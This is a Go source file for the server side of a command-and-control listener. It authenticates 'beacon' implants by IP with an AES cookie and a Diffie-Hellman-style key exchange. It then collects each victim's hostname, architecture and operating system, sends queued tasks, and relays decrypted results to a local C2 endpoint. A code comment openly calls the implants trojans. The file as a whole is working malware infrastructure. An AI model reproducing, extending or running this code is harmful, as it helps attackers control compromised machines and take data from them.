package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math"
	"math/big"
	"net"
	"net/http"
	"reflect"
)

func GET_handler(cookie string, listener *Listener, r *http.Request) ([]byte, bool) {
	var res []byte
	cookie_decode, err := base64.StdEncoding.DecodeString(cookie)
	ip, _, _ := net.SplitHostPort(r.RemoteAddr)

	aAES := getAES(listener.A)

	if err != nil {
		fmt.Println("AESa base64 not match" + err.Error())
		return res, false
	} else if len(cookie_decode) != 32 {
		fmt.Println("AESa 16BYTES not match")

		return res, false
	}
	decrypt, succ := aAES.DecryptData(cookie_decode)
	if !succ {
		println("decrypt A fail.")
	}
	if reflect.DeepEqual(listener.A, decrypt) {
		if Check_Beacon_ip(listener, ip) {
			removeBeaconByIP(listener, ip) //暂时只考虑一个ip一个木马的情况
			Create_beacon_1(listener, ip)
		} else {
			Create_beacon_1(listener, ip)
		}

		fmt.Println("AESa had match")
		return res, true
	} else {
		fmt.Println("AESa not match")
		return res, false
	}
}

func POST_handler(body []byte, listener *Listener, r *http.Request, w http.ResponseWriter) ([]byte, bool) {

	var res []byte
	ip, _, _ := net.SplitHostPort(r.RemoteAddr)
	domain := r.Host

	println("1")

	for i, beacon := range listener.Beacons {
		if beacon.Ip == ip && beacon.AESkey == "" && beacon.Arch == "" {

			println("2")

			var CusAes big.Int
			CusAes.SetBytes(ReverseBytes(GetBytes(body, 16)))
			Srvkey := Random_Big_Int128()
			Create_beacon_2(listener, &CusAes, Srvkey, ip, domain, i)
			SrvAes := Mod_Pow(Bytes_To_BigInt(ReverseBytes(listener.A)), Srvkey)

			fmt.Printf("%x", stringToBytes(listener.Beacons[i].AESkey))

			res = append(res, ReverseBytes(SrvAes.Bytes())...)
			return res, true

		} else if beacon.Ip == ip && beacon.AESkey != "" && beacon.Arch == "" {
			bigInt := new(big.Int)
			bigInt, _ = bigInt.SetString(beacon.AESkey, 10)
			eAES := getAES(ReverseBytes(bigInt.Bytes()))

			eAES.printKey()
			println("encrypted data = ")
			printkey(body)
			json_byte, succ := eAES.DecryptData(GetBytes(body, len(body)))
			if !succ {
				println("AES Decrypt fail")
			}

			var beacon_tmp Beacon

			println("decrypt = ")
			printkey(json_byte)
			println(string(json_byte))

			err := json.Unmarshal(json_byte, &beacon_tmp)

			if err != nil {
				fmt.Println("Error:", err)
			}

			listener.Beacons[i].Hostname = beacon_tmp.Hostname
			listener.Beacons[i].Arch = beacon_tmp.Arch
			listener.Beacons[i].System = beacon_tmp.System

			println("saving xml")
			ModifyBeacons("./Listener/"+listener.Lisname, listener.Beacons)

			return res, true

		} else if beacon.Ip == ip && beacon.AESkey != "" && beacon.Arch != "" {
			eAES := getAES(stringToBytes(beacon.AESkey))
			json_byte, _ := eAES.DecryptData(ReverseBytes(GetBytes(body, len(body))))
			if json_byte == nil {
				if is_jobs_null(listener, i) {
					return res, true // sleep
				} else {
					res = append(res, make_fucker(listener, i)...)
					res = eAES.EncryptData(res)
					return ReverseBytes(res), true
				}
			} else {
				remove_job(listener, i)
				json_byte = append(json_byte, 0x00, IntToUint8(i))
				Send_Bytes_to(w, json_byte, "http://localhost:50049/c2", expectedHeaders)
				res = append(res, make_fucker(listener, i)...)
				res = eAES.EncryptData(res)
				return res, true // commit
			}

		} else {
			continue
		}
	}
	return res, false

}

func printkey(arr []byte) {
	i := 0
	for i < len(arr) {
		if i%16 == 0 && i != 0 {
			fmt.Print("        ")
			j := 0
			for j < 16 {
				fmt.Printf("%c", arr[i-16+j])
				j += 1
			}

			fmt.Println("")
		}
		fmt.Printf("%02x ", arr[i])
		i += 1
	}
}

func GetBytes(data []byte, length int) []byte {
	if length > len(data) {
		length = len(data)
	}
	var res []byte
	res = data[:length]
	data = data[length:]
	return res
}

func stringToBytes(s string) []byte {
	num := new(big.Int)
	_, ok := num.SetString(s, 10)
	if !ok {
		return nil
	}

	byteSlice := num.Bytes()
	return byteSlice
}

func ReverseBytes(data []byte) []byte {
	reversed := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		reversed[len(data)-1-i] = data[i]
	}
	return reversed
}

func Debug_ip(listener *Listener, ip string) {
	for _, b := range listener.Beacons {
		if b.Ip == ip {
			println(b.AESkey)
		}
	}

}

func IntToUint8(num int) uint8 {
	// 检查是否溢出
	if num < 0 || num > math.MaxUint8 {
		return 0
	}

	return uint8(num)
}
